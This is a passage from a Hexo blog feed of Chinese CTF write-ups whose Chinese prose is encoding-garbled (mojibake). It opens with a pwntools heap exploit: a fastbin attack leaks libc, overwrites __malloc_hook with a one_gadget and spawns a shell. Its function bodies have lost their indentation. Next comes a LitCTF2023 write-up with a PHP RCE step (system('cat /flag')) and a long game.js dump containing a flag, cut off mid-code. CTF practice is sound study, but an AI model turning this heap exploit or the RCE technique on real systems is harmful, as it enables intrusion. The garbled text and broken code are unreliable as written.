¹æ®åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ç®—åç§»ï¼Œæ‹¿åˆ° /bin/sh ç­‰çš„åœ°å€ï¼Œå…·ä½“åŸç†ä¹‹åå†çœ‹ï¼Œå…ˆäº†è§£ä¸‹è¿™æ˜¯ä¸ªå•¥ä¸œè¥¿ï¼Œå’‹æ“ä½œçš„ï¼Œç›´æ¥è´´ä¸€ä¸ªå¤§ä½¬çš„ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./heap&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug :</span><br><span class="line">    io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class="number">28352</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(filename)</span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;idx? &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;size? &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;idx? &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;idx? &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;idx? &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;content : &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content : &#x27;</span>)</span><br><span class="line">__malloc_hook = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x68</span></span><br><span class="line">success(<span class="string">&#x27;__malloc_hook =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">libcbase = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget = libcbase + <span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x13</span> + p64(onegadget))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€2023ã€‘LitCTF</title>
      <link href="/posts/a929fb97.html"/>
      <url>/posts/a929fb97.html</url>
      
        <content type="html"><![CDATA[<h1 id="litctf2023å¤ç°"><a class="markdownIt-Anchor" href="#litctf2023å¤ç°">#</a> LitCTF2023ï¼ˆå¤ç°ï¼‰</h1><h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Webï¼š</h1><h2 id="1-æˆ‘flagå‘¢"><a class="markdownIt-Anchor" href="#1-æˆ‘flagå‘¢">#</a> 1ã€æˆ‘ Flag å‘¢ï¼Ÿ</h2><p>â€‹ctrl+u è¯»å–æºç ï¼Œåœ¨æœ€åå‘ç°äº† flagï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--flag is here flag=NSSCTF&#123;3d5218b9-4e24-4d61-9c15-68f8789e8c48&#125; --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a class="markdownIt-Anchor" href="#2-phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€">#</a> 2ã€PHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼</h2><p><img data-src="https://img-blog.csdnimg.cn/direct/47790a355a0b4aa1b229b67d2e9b6728.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å³è¾¹é‚£ä¸ªæ¡†ä¸‹é¢æ˜¯ RUN CODE ï¼Œç»“åˆé¢˜ç›®æ˜¯ PHPï¼Œæ¨æµ‹ä¸º RCEï¼Œå…ˆè¾“å…¥ echo 123; çœ‹çœ‹ä¼šå‘ç”Ÿå•¥ï¼šå‘ç°å·¦è¾¹è¾“å‡ºå†…å®¹å‡ºç°äº† 123ï¼Œé‚£ä¹ˆï¼Œç›´æ¥ system (â€œcat /flagâ€); æˆåŠŸæ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=NSSCTF&#123;b26d3851-52f5-4a80-9e69-6417baf49d68&#125;</span><br></pre></td></tr></table></figure><h2 id="3-å¯¼å¼¹è¿·è¸ª"><a class="markdownIt-Anchor" href="#3-å¯¼å¼¹è¿·è¸ª">#</a> 3ã€å¯¼å¼¹è¿·è¸ª</h2><p>â€‹js æ¸¸æˆé¢˜ï¼Œå…ˆçœ‹æºç ï¼Œè¿™é‡Œçœ‹ game.jsï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">MG</span>.<span class="property">game</span> = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Constants **/</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">GameState</span> = &#123;</span><br><span class="line">        <span class="attr">WAIT_START</span>: <span class="string">&#x27;wait_start&#x27;</span>,</span><br><span class="line">        <span class="attr">STARTING</span>:   <span class="string">&#x27;starting&#x27;</span>,</span><br><span class="line">        <span class="attr">RUNNING</span>:    <span class="string">&#x27;running&#x27;</span>,</span><br><span class="line">        <span class="attr">FINISHED</span>:   <span class="string">&#x27;finished&#x27;</span>,</span><br><span class="line">        <span class="attr">CRASHED</span>:    <span class="string">&#x27;crashed&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">STARTING_LIVES</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">LEVEL_NUM_BARRIERS</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Variables **/</span></span><br><span class="line">    <span class="keyword">var</span> mState = <span class="title class_">GameState</span>.<span class="property">WAIT_START</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mLives = <span class="variable constant_">STARTING_LIVES</span>;</span><br><span class="line">    <span class="keyword">var</span> mLevel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mRemainingBarriers = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> mBarriersToPass = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mProgress = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">var</span> mBestProgress = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Strings for UI ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</span></span><br><span class="line">    <span class="keyword">var</span> getLevelString = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> mLevel ? <span class="string">&#x27;LEVEL &#x27;</span> + mLevel : <span class="string">&#x27;QUALIFYING LEVEL&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Messages</span> = &#123;</span><br><span class="line">        <span class="attr">START</span>: &#123;</span><br><span class="line">            <span class="attr">title</span>: getLevelString,</span><br><span class="line">            <span class="attr">text</span>:  <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;CLICK TO BEGIN&#x27;</span>;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">CRASH</span>: &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;CRASHED&#x27;</span>;&#125;,</span><br><span class="line">            <span class="attr">text</span>:  <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;CLICK TO RETRY&#x27;</span>;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">GAME_OVER</span>: &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;GAME OVER&#x27;</span>;&#125;,</span><br><span class="line">            <span class="attr">text</span>:  <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;CLICK TO START AGAIN&#x27;</span>;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">FINISH</span>: &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;LEVEL COMPLETED&#x27;</span>;&#125;,</span><br><span class="line">            <span class="attr">text</span>:  <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">if</span> (mLevel === <span class="number">6</span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;GOT F|L|A|G &#123;y0u_w1n_th1s_!!!&#125;&#x27;</span>;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&#x27;CLICK TO CONTINUE&#x27;</span>;&#125;&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> getLevelStartVelocity   = <span class="keyword">function</span> (<span class="params">level</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">300</span> + <span class="number">100</span>*level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> getLevelFinishVelocity  = <span class="keyword">function</span> (<span class="params">level</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">400</span> + <span class="number">100</span>*level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> getPreLevelIdleVelocity = <span class="keyword">function</span> (<span class="params">level</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">350</span> + <span class="number">100</span>*level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> getPostLevelIdleVelocity = <span class="keyword">function</span> (<span class="params">level</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">550</span> + <span class="number">100</span>*level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> playCrashAnimation = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// TODO move drawing out of the update loop</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// create a copy of the explosion element</span></span><br><span class="line">        <span class="keyword">var</span> explosion = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;explosion&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// play the animation</span></span><br><span class="line">        explosion.<span class="property">firstChild</span>.<span class="title function_">beginElement</span>();</span><br><span class="line">        explosion.<span class="title function_">setAttribute</span>(<span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;visible&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can&#x27;t seem to get a callback to fire when the animation</span></span><br><span class="line">        <span class="comment">// finishes. Use timeout instead</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> explosion = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;explosion&#x27;</span>);</span><br><span class="line">            explosion.<span class="title function_">setAttribute</span>(<span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">400</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> goWaitStartLevel = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">banner</span>.<span class="title function_">show</span>(<span class="title class_">Messages</span>.<span class="property">START</span>.<span class="title function_">title</span>(), <span class="title class_">Messages</span>.<span class="property">START</span>.<span class="title function_">text</span>());</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">util</span>.<span class="title function_">showMouse</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">setAutopilot</span>();</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">setVelocity</span>(<span class="title function_">getPreLevelIdleVelocity</span>(mLevel));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mLevel === <span class="number">0</span>) &#123;mLives = <span class="title class_">Infinity</span>;&#125;</span><br><span class="line"></span><br><span class="line">        mState = <span class="title class_">GameState</span>.<span class="property">WAIT_START</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">var</span> goRun = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">banner</span>.<span class="title function_">hide</span>();</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">util</span>.<span class="title function_">hideMouse</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* TODO should the start barrier be pushed here?</span></span><br><span class="line"><span class="comment">        If so, should all of the barriers for the entire level be pushed as well? */</span></span><br><span class="line">        mRemainingBarriers = <span class="variable constant_">LEVEL_NUM_BARRIERS</span>;</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">pushBarrier</span>(<span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">START</span>);</span><br><span class="line"></span><br><span class="line">        mBarriersToPass = <span class="variable constant_">LEVEL_NUM_BARRIERS</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">setManual</span>();</span><br><span class="line"></span><br><span class="line">        mState = <span class="title class_">GameState</span>.<span class="property">STARTING</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> goFinish = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">banner</span>.<span class="title function_">show</span>(<span class="title class_">Messages</span>.<span class="property">FINISH</span>.<span class="title function_">title</span>(), <span class="title class_">Messages</span>.<span class="property">FINISH</span>.<span class="title function_">text</span>());</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">util</span>.<span class="title function_">showMouse</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">setAutopilot</span>();</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">setVelocity</span>(<span class="title function_">getPostLevelIdleVelocity</span>(mLevel));</span><br><span class="line"></span><br><span class="line">        mState = <span class="title class_">GameState</span>.<span class="property">FINISHED</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> goCrash = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable constant_">MG</span>.<span class="property">util</span>.<span class="title function_">showMouse</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mLives === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">banner</span>.<span class="title function_">show</span>(<span class="title class_">Messages</span>.<span class="property">GAME_OVER</span>.<span class="title function_">title</span>(), <span class="title class_">Messages</span>.<span class="property">GAME_OVER</span>.<span class="title function_">text</span>());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">banner</span>.<span class="title function_">show</span>(<span class="title class_">Messages</span>.<span class="property">CRASH</span>.<span class="title function_">title</span>(), <span class="title class_">Messages</span>.<span class="property">CRASH</span>.<span class="title function_">text</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">playCrashAnimation</span>()</span><br><span class="line"></span><br><span class="line">        mState = <span class="title class_">GameState</span>.<span class="property">CRASHED</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//==========================================================================</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> rootNode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tunnel&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">init</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> wallNode;</span><br><span class="line"></span><br><span class="line">            wallNode = <span class="variable language_">document</span>.<span class="title function_">createElementNS</span>(<span class="variable constant_">NAMESPACE_SVG</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">            wallNode.<span class="title function_">setAttribute</span>(<span class="string">&#x27;transform&#x27;</span>, <span class="string">&#x27;scale(1,-1)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">tunnelWall</span>.<span class="title function_">init</span>(wallNode);</span><br><span class="line"></span><br><span class="line">            rootNode.<span class="title function_">appendChild</span>(wallNode);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> barrierQueueNode;</span><br><span class="line"></span><br><span class="line">            barrierQueueNode = <span class="variable language_">document</span>.<span class="title 